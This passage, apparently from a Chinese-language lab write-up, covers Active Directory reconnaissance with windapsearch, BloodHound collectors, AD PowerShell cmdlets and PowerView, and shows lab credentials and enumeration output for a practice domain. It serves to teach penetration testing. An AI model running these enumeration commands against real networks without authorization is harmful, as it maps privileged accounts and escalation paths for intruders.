windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da</span><br><span class="line"></span><br><span class="line">[+] Using Domain Controller at: 172.16.5.5</span><br><span class="line">[+] Getting defaultNamingContext from Root DSE</span><br><span class="line">[+]Found: DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[+] Attempting bind</span><br><span class="line">[+]...success! Binded as: </span><br><span class="line">[+] u:INLANEFREIGHT\forend</span><br><span class="line">[+] Attempting to enumerate all Domain Admins</span><br><span class="line">[+] Using DN: CN=Domain Admins,CN=Users.CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[+]Found 28 Domain Admins:</span><br><span class="line"></span><br><span class="line">cn: Administrator</span><br><span class="line">userPrincipalName: administrator@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: lab_adm</span><br><span class="line"></span><br><span class="line">cn: Matthew Morgan</span><br><span class="line">userPrincipalName: mmorgan@inlanefreight.local</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p><code>-PU</code> 查找特权用户，能对具有嵌套组成员身份的用户执行递归搜索</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">$ python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU</span><br><span class="line"></span><br><span class="line">[+] Using Domain Controller at: 172.16.5.5</span><br><span class="line">[+] Getting defaultNamingContext from Root DSE</span><br><span class="line">[+]     Found: DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[+] Attempting bind</span><br><span class="line">[+]     ...success! Binded as:</span><br><span class="line">[+]      u:INLANEFREIGHT\forend</span><br><span class="line">[+] Attempting to enumerate all AD privileged users</span><br><span class="line">[+] Using DN: CN=Domain Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[+]     Found 28 nested users for group Domain Admins:</span><br><span class="line"></span><br><span class="line">cn: Administrator</span><br><span class="line">userPrincipalName: administrator@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: lab_adm</span><br><span class="line"></span><br><span class="line">cn: Angela Dunn</span><br><span class="line">userPrincipalName: adunn@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: Matthew Morgan</span><br><span class="line">userPrincipalName: mmorgan@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: Dorothy Click</span><br><span class="line">userPrincipalName: dclick@inlanefreight.local</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">[+] Using DN: CN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">[+]     Found 3 nested users for group Enterprise Admins:</span><br><span class="line"></span><br><span class="line">cn: Administrator</span><br><span class="line">userPrincipalName: administrator@inlanefreight.local</span><br><span class="line"></span><br><span class="line">cn: lab_adm</span><br><span class="line"></span><br><span class="line">cn: Sharepoint Admin</span><br><span class="line">userPrincipalName: sp-admin@INLANEFREIGHT.LOCAL</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h2 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h2><p>该工具由两部分组成：用 C# 编写的用于 Windows 系统的<a href="https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors">SharpHound 收集器</a>，或本节中的 BloodHound.py 收集器（也称为<code>ingestor</code>）和<a href="https://github.com/BloodHoundAD/BloodHound/releases">BloodHound</a> GUI 工具，它允许以 JSON 文件的形式上传收集的数据。该工具从 AD 收集数据，例如用户、组、计算机、组成员身份、GPO、ACL、域信任、本地管理员访问、用户会话、计算机和用户属性、RDP 访问、WinRM 访问等。</p><h3 id="SharpHound-exe"><a href="#SharpHound-exe" class="headerlink" title="SharpHound.exe"></a>SharpHound.exe</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; .\SharpHound.exe <span class="literal">-c</span> All</span><br></pre></td></tr></table></figure><h3 id="bloodhound-python"><a href="#bloodhound-python" class="headerlink" title="bloodhound-python"></a>bloodhound-python</h3><p>它最初仅与 PowerShell 收集器一起发布，因此必须从 Windows 主机运行。最终，社区成员发布了 Python 端口（需要 Impacket、<code>ldap3</code>和<code>dnspython</code>）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ sudo bloodhound-python -ns 172.16.5.5 -d inlanefreight.local -u &#x27;forend&#x27; -p &#x27;Klmcargo2&#x27; -c all</span><br><span class="line"></span><br><span class="line">INFO: Found AD domain: inlanefreight.local</span><br><span class="line">INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">INFO: Found 1 domains</span><br><span class="line">INFO: Found 2 domains in the forest</span><br><span class="line">INFO: Found 564 computers</span><br><span class="line">INFO: Connecting to LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">INFO: Found 2951 users</span><br><span class="line">INFO: Connecting to GC LDAP server: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">INFO: Found 183 groups</span><br><span class="line">INFO: Found 2 trusts</span><br><span class="line">INFO: Starting computer enumeration with 10 workers</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h3 id="upload"><a href="#upload" class="headerlink" title="upload"></a>upload</h3><p>启动 neo4j，打开 BloodHound GUI，上传 json 或 zip 文件。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729153210311.png" alt="bh-injest"></p><p><code>Find Shortest Paths To Domain Admins</code>，它将为提供通过用户&#x2F;组&#x2F;主机&#x2F;ACL&#x2F;GPO 等关系找到的任何逻辑路径，这些关系可能允许升级到域管理员权限或同等权限。</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1729153271546.png" alt="bh-analysis"></p><h2 id="PowerShell"><a href="#PowerShell" class="headerlink" title="PowerShell"></a>PowerShell</h2><p>ActiveDirectory PowerShell Module 是一组 PowerShell cmdlet，用于从命令行管理 Active Directory 环境。</p><h3 id="Get-Module"><a href="#Get-Module" class="headerlink" title="Get-Module"></a>Get-Module</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-Module</span></span><br><span class="line"></span><br><span class="line">ModuleType Version    Name                                ExportedCommands</span><br><span class="line"><span class="literal">----------</span> <span class="literal">-------</span>    <span class="literal">----</span>                                <span class="literal">----------------</span></span><br><span class="line">Manifest   <span class="number">3.1</span>.<span class="number">0.0</span>    Microsoft.PowerShell.Utility        &#123;<span class="built_in">Add-Member</span>, <span class="built_in">Add-Type</span>, <span class="built_in">Clear-Variable</span>, <span class="built_in">Compare-Object</span>...&#125;</span><br><span class="line">Script     <span class="number">2.0</span>.<span class="number">0</span>      PSReadline                          &#123;<span class="built_in">Get-PSReadLineKeyHandler</span>, <span class="built_in">Get-PSReadLineOption</span>, <span class="built_in">Remove-PS</span>...</span><br></pre></td></tr></table></figure><h3 id="ActiveDirectory-Module"><a href="#ActiveDirectory-Module" class="headerlink" title="ActiveDirectory Module"></a>ActiveDirectory Module</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Import-Module</span> ActiveDirectory</span><br><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-Module</span></span><br><span class="line"></span><br><span class="line">ModuleType Version    Name                                ExportedCommands</span><br><span class="line"><span class="literal">----------</span> <span class="literal">-------</span>    <span class="literal">----</span>                                <span class="literal">----------------</span></span><br><span class="line">Manifest   <span class="number">1.0</span>.<span class="number">1.0</span>    ActiveDirectory                     &#123;<span class="built_in">Add-ADCentralAccessPolicyMember</span>, <span class="built_in">Add-ADComputerServiceAcc</span>...</span><br><span class="line">Manifest   <span class="number">3.1</span>.<span class="number">0.0</span>    Microsoft.PowerShell.Utility        &#123;<span class="built_in">Add-Member</span>, <span class="built_in">Add-Type</span>, <span class="built_in">Clear-Variable</span>, <span class="built_in">Compare-Object</span>...&#125;</span><br><span class="line">Script     <span class="number">2.0</span>.<span class="number">0</span>      PSReadline                          &#123;<span class="built_in">Get-PSReadLineKeyHandler</span>, <span class="built_in">Get-PSReadLineOption</span>, <span class="built_in">Remove-PS</span>...  </span><br></pre></td></tr></table></figure><h3 id="Get-ADDomain"><a href="#Get-ADDomain" class="headerlink" title="Get-ADDomain"></a>Get-ADDomain</h3><p>获取域名信息，这将打印出有用的信息，如域 SID、域功能级别、任何子域等。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADDomain</span></span><br><span class="line"></span><br><span class="line">AllowedDNSSuffixes                 : &#123;&#125;</span><br><span class="line">ChildDomains                       : &#123;LOGISTICS.INLANEFREIGHT.LOCAL&#125;</span><br><span class="line">ComputersContainer                 : CN=Computers,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">DeletedObjectsContainer            : CN=Deleted Objects,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">DistinguishedName                  : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">DNSRoot                            : INLANEFREIGHT.LOCAL</span><br><span class="line">DomainControllersContainer         : OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">DomainMode                         : Windows2016Domain</span><br><span class="line">DomainSID                          : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114</span></span><br><span class="line">ForeignSecurityPrincipalsContainer : CN=ForeignSecurityPrincipals,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Forest                             : INLANEFREIGHT.LOCAL</span><br><span class="line">InfrastructureMaster               : ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL</span><br><span class="line">LastLogonReplicationInterval       :</span><br><span class="line">LinkedGroupPolicyObjects           : &#123;cn=&#123;DDBB8574<span class="literal">-E94E-4525-8C9D-ABABE31223D0</span>&#125;,cn=policies,cn=system,DC=INLANEFREIGHT,</span><br><span class="line">                                     DC=LOCAL, CN=&#123;<span class="number">31</span>B2F340<span class="literal">-016D-11D2-945F-00C04FB984F9</span>&#125;,CN=Policies,CN=System,DC=INLAN</span><br><span class="line">                                     EFREIGHT,DC=LOCAL&#125;</span><br><span class="line">LostAndFoundContainer              : CN=LostAndFound,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ManagedBy                          :</span><br><span class="line">Name                               : INLANEFREIGHT</span><br><span class="line">NetBIOSName                        : INLANEFREIGHT</span><br><span class="line">ObjectClass                        : domainDNS</span><br><span class="line">ObjectGUID                         : <span class="number">71</span>e4ecd1<span class="literal">-a9f6-4f55-8a0b-e8c398fb547a</span></span><br><span class="line">ParentDomain                       :</span><br><span class="line">PDCEmulator                        : ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL</span><br><span class="line">PublicKeyRequiredPasswordRolling   : True</span><br><span class="line">QuotasContainer                    : CN=NTDS Quotas,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ReadOnlyReplicaDirectoryServers    : &#123;&#125;</span><br><span class="line">ReplicaDirectoryServers            : &#123;ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL&#125;</span><br><span class="line">RIDMaster                          : ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL</span><br><span class="line">SubordinateReferences              : &#123;DC=LOGISTICS,DC=INLANEFREIGHT,DC=LOCAL,</span><br><span class="line">                                     DC=ForestDnsZones,DC=INLANEFREIGHT,DC=LOCAL,</span><br><span class="line">                                     DC=DomainDnsZones,DC=INLANEFREIGHT,DC=LOCAL,</span><br><span class="line">                                     CN=Configuration,DC=INLANEFREIGHT,DC=LOCAL&#125;</span><br><span class="line">SystemsContainer                   : CN=System,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">UsersContainer                     : CN=Users,DC=INLANEFREIGHT,DC=LOCAL</span><br></pre></td></tr></table></figure><h3 id="Get-ADUser"><a href="#Get-ADUser" class="headerlink" title="Get-ADUser"></a>Get-ADUser</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADUser</span> <span class="literal">-Filter</span> &#123;ServicePrincipalName <span class="operator">-ne</span> <span class="string">&quot;<span class="variable">$null</span>&quot;</span>&#125; <span class="literal">-Properties</span> ServicePrincipalName</span><br><span class="line"></span><br><span class="line">DistinguishedName    : CN=adfs,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Enabled              : True</span><br><span class="line">GivenName            : Sharepoint</span><br><span class="line">Name                 : adfs</span><br><span class="line">ObjectClass          : user</span><br><span class="line">ObjectGUID           : <span class="number">49</span>b53bea<span class="literal">-4bc4-4a68-b694-b806d9809e95</span></span><br><span class="line">SamAccountName       : adfs</span><br><span class="line">ServicePrincipalName : &#123;adfsconnect/azure01.inlanefreight.local&#125;</span><br><span class="line">SID                  : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5244</span></span><br><span class="line">Surname              : Admin</span><br><span class="line">UserPrincipalName    :</span><br><span class="line"></span><br><span class="line">DistinguishedName    : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Enabled              : True</span><br><span class="line">GivenName            : Jessica</span><br><span class="line">Name                 : BACKUPAGENT</span><br><span class="line">ObjectClass          : user</span><br><span class="line">ObjectGUID           : <span class="number">2</span>ec53e98<span class="literal">-3a64-4706-be23-1d824ff61bed</span></span><br><span class="line">SamAccountName       : backupagent</span><br><span class="line">ServicePrincipalName : &#123;backupjob/veam001.inlanefreight.local&#125;</span><br><span class="line">SID                  : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5220</span></span><br><span class="line">Surname              : Systemmailbox <span class="number">8</span>Cc370d3<span class="literal">-822A-4Ab8-A926-Bb94bd0641a9</span></span><br><span class="line">UserPrincipalName    :</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><h3 id="Get-ADTrust"><a href="#Get-ADTrust" class="headerlink" title="Get-ADTrust"></a>Get-ADTrust</h3><p>打印出域具有的任何信任关系。可以确定它们是林内的信任还是与其他林中的域的信任、信任类型、信任方向以及关系所属域的名称。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADTrust</span> <span class="literal">-Filter</span> *</span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ForestTransitive        : False</span><br><span class="line">IntraForest             : True</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">Name                    : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">ObjectGUID              : f48a1169<span class="literal">-2e58-42c1-ba32-a6ccb10057ec</span></span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">Source                  : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Target                  : LOGISTICS.INLANEFREIGHT.LOCAL</span><br><span class="line">TGTDelegation           : False</span><br><span class="line">TrustAttributes         : <span class="number">32</span></span><br><span class="line">TrustedPolicy           :</span><br><span class="line">TrustingPolicy          :</span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False</span><br><span class="line"></span><br><span class="line">Direction               : BiDirectional</span><br><span class="line">DisallowTransivity      : False</span><br><span class="line">DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">ForestTransitive        : True</span><br><span class="line">IntraForest             : False</span><br><span class="line">IsTreeParent            : False</span><br><span class="line">IsTreeRoot              : False</span><br><span class="line">Name                    : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">ObjectClass             : trustedDomain</span><br><span class="line">ObjectGUID              : <span class="number">1597717</span>f<span class="literal">-89b7-49b8-9cd9-0801d52475ca</span></span><br><span class="line">SelectiveAuthentication : False</span><br><span class="line">SIDFilteringForestAware : False</span><br><span class="line">SIDFilteringQuarantined : False</span><br><span class="line">Source                  : DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">Target                  : FREIGHTLOGISTICS.LOCAL</span><br><span class="line">TGTDelegation           : False</span><br><span class="line">TrustAttributes         : <span class="number">8</span></span><br><span class="line">TrustedPolicy           :</span><br><span class="line">TrustingPolicy          :</span><br><span class="line">TrustType               : Uplevel</span><br><span class="line">UplevelOnly             : False</span><br><span class="line">UsesAESKeys             : False</span><br><span class="line">UsesRC4Encryption       : False  </span><br></pre></td></tr></table></figure><h3 id="Get-ADGroup"><a href="#Get-ADGroup" class="headerlink" title="Get-ADGroup"></a>Get-ADGroup</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADGroup</span> <span class="literal">-Filter</span> * | <span class="built_in">select</span> name</span><br><span class="line"></span><br><span class="line">name</span><br><span class="line"><span class="literal">----</span></span><br><span class="line">Administrators</span><br><span class="line">Users</span><br><span class="line">Guests</span><br><span class="line">Print Operators</span><br><span class="line">Backup Operators</span><br><span class="line">Replicator</span><br><span class="line">Remote Desktop Users</span><br><span class="line">Network Configuration Operators</span><br><span class="line">Performance Monitor Users</span><br><span class="line">Performance Log Users</span><br><span class="line">Distributed COM Users</span><br><span class="line">IIS_IUSRS</span><br><span class="line">Cryptographic Operators</span><br><span class="line">Event Log Readers</span><br><span class="line">Certificate Service DCOM Access</span><br><span class="line">RDS Remote Access Servers</span><br><span class="line">RDS Endpoint Servers</span><br><span class="line">RDS Management Servers</span><br><span class="line">Hyper<span class="literal">-V</span> Administrators</span><br><span class="line">Access Control Assistance Operators</span><br><span class="line">Remote Management Users</span><br><span class="line">Storage Replica Administrators</span><br><span class="line">Domain Computers</span><br><span class="line">Domain Controllers</span><br><span class="line">Schema Admins</span><br><span class="line">Enterprise Admins</span><br><span class="line">Cert Publishers</span><br><span class="line">Domain Admins</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure><p>指定组名</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADGroup</span> <span class="literal">-Identity</span> <span class="string">&quot;Backup Operators&quot;</span></span><br><span class="line"></span><br><span class="line">DistinguishedName : CN=Backup Operators,CN=Builtin,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">GroupCategory     : Security</span><br><span class="line">GroupScope        : DomainLocal</span><br><span class="line">Name              : Backup Operators</span><br><span class="line">ObjectClass       : <span class="built_in">group</span></span><br><span class="line">ObjectGUID        : <span class="number">6276</span>d85d<span class="literal">-9c39-4b7c-8449-cad37e8abc38</span></span><br><span class="line">SamAccountName    : Backup Operators</span><br><span class="line">SID               : S<span class="literal">-1-5-32-551</span></span><br></pre></td></tr></table></figure><h3 id="Get-ADGroupMember"><a href="#Get-ADGroupMember" class="headerlink" title="Get-ADGroupMember"></a>Get-ADGroupMember</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt; <span class="built_in">Get-ADGroupMember</span> <span class="literal">-Identity</span> <span class="string">&quot;Backup Operators&quot;</span></span><br><span class="line"></span><br><span class="line">distinguishedName : CN=BACKUPAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL</span><br><span class="line">name              : BACKUPAGENT</span><br><span class="line">objectClass       : user</span><br><span class="line">objectGUID        : <span class="number">2</span>ec53e98<span class="literal">-3a64-4706-be23-1d824ff61bed</span></span><br><span class="line">SamAccountName    : backupagent</span><br><span class="line">SID               : S<span class="literal">-1-5-21-3842939050-3880317879-2865463114-5220</span></span><br></pre></td></tr></table></figure><h2 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h2><p><a href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon">PowerView</a>是一个用 PowerShell 编写的工具，可帮助在 AD 环境中获得态势感知。与 BloodHound 非常相似，它提供了一种方法来识别用户在网络上的登录位置、枚举域信息（例如用户、计算机、组、ACLS、信任）、搜索文件共享和密码、执行 Kerberoasting 等。</p><table><thead><tr><th>Command</th><th>Description</th></tr></thead><tbody><tr><td><code>Export-PowerViewCSV</code></td><td>将结果附加到 CSV 文件</td></tr><tr><td><code>ConvertTo-SID</code></td><td>将用户或组名称转换为其 SID 值</td></tr><tr><td><code>Get-DomainSPNTicket</code></td><td>为指定的服务主体名称 (SPN) 帐户请求 Kerberos 票证</td></tr><tr><td><strong>Domain&#x2F;LDAP Functions:</strong></td><td></td></tr><tr><td><code>Get-Domain</code></td><td>将返回当前（或指定）域的 AD 对象</td></tr><tr><td><code>Get-DomainController</code></td><td>返回指定域的域控制器列表</td></tr><tr><td><code>Get-DomainUser</code></td><td>将返回 AD 中的所有用户或特定用户对象</td></tr><tr><td><code>Get-DomainComputer</code></td><td>将返回 AD 中的所有计算机或特定计算机对象</td></tr><tr><td><code>Get-DomainGroup</code></td><td>将返回 AD 中的所有组或特定组对象</td></tr><tr><td><code>Get-DomainOU</code></td><td>搜索 AD 中所有或特定的 OU 对象</td></tr><tr><td><code>Find-InterestingDomainAcl</code></td><td>在域中查找将修改权限设置为非内置对象的对象 ACL</td></tr><tr><td><code>Get-DomainGroupMember</code></td><td>将返回特定域组的成员</td></tr><tr><td><code>Get-DomainFileServer</code></td><td>返回可能充当文件服务器的服务器列表</td></tr><tr><td><code>Get-DomainDFSShare</code></td><td>返回当前（或指定）域的所有分布式文件系统的列表</td></tr><tr><td><strong>GPO Functions:</strong></td><td></td></tr><tr><td><code>Get-DomainGPO</code></td><td>将返回 AD 中的所有 GPO 或特定 GPO 对象</td></tr><tr><td><code>Get-DomainPolicy</code></td><td>返回当前域的默认域策略或域控制器策略</td></tr><tr><td><strong>Computer Enumeration Functions:</strong></td><td></td></tr><tr><td><code>Get-NetLocalGroup</code></td><td>枚举本地或远程计算机上的本地组</td></tr><tr><td><code>Get-NetLocalGroupMember</code></td><td>枚举特定本地组的成员</td></tr><tr><td><code>Get-NetShare</code></td><td>返回本地（或远程）机器上的开放共享</td></tr><tr><td><code>Get-NetSession</code></td><td>将返回本地（或远程）机器的会话信息</td></tr><tr><td><code>Test-AdminAccess</code></td><td>测试当前用户是否具有本地（或远程）计算机的管理访问权限</td></tr><tr><td><strong>Threaded ‘Meta’-Functions:</strong></td><td></td></tr><tr><td><code>Find-DomainUserLocation</code></td><td>查找特定用户登录的机器</td></tr><tr><td><code>Find-DomainShare</code></td><td>查找域机器上可访问的共享</td></tr><tr><td><code>Find-InterestingDomainShareFile</code></td><td>在域中的可读共享中搜索符合特定条件的文件</td></tr><tr><td><code>Find-LocalAdminAccess</code></td><td>在本地域中查找当前用户具有本地管理员访问权限的计算机</td></tr><tr><td><strong>Domain Trust Functions:</strong></td><td></td></tr><tr><td><code>Get-DomainTrust</code></td><td>返回当前域或指定域的域信任</td></tr><tr><td><code>Get-ForestTrust</code></td><td>返回当前林或指定林的所有林信任</td></tr><tr><td><code>Get-DomainForeignUser</code></td><td>枚举用户域外群组中的用户</td></tr><tr><td><code>Get-DomainForeignGroupMember</code></td><td>枚举组域外的用户组并返回每个外部成员</td></tr><tr><td><code>Get-DomainTrustMapping</code></td><td>将枚举当前域和任何其他可见域的所有信任。</td></tr></tbody></table><h3 id="Get-DomainUser"><a href="#Get-DomainUser" class="headerlink" title="Get-DomainUser"></a>Get-DomainUser</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 